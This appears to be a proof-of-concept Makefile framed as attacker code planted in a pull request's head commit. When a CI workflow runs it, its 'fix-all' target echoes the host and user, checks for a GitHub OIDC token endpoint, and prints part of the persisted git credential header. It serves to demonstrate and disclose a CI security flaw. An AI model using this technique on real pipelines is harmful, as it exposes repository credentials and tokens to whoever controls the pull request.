# Attacker-controlled Makefile delivered in the PR head commit
fix-all:
	@echo "PWNED-from-PR-head-host=$$(hostname) user=$$(id -un)"
	@echo "OIDC_available=$${ACTIONS_ID_TOKEN_REQUEST_URL:+yes}"
	@echo "PERSISTED_CRED_HEADER=$$(git config --get http.https://github.com/.extraheader | cut -c1-22)"
